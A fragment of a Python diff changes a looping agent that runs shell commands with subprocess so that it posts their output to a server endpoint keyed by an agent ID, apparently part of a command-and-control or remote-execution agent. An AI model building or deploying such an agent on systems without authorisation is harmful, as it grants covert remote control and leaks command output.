@@ -28,4 +28,5 @@ while True:
         continue
 
     result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-    print(result.stdout)
+    requests.post(url=f"http://127.0.0.1:5000/agent/{uuid}/output", data=result.stdout + result.stderr, headers={"Content-Type": "text/plain"})
+
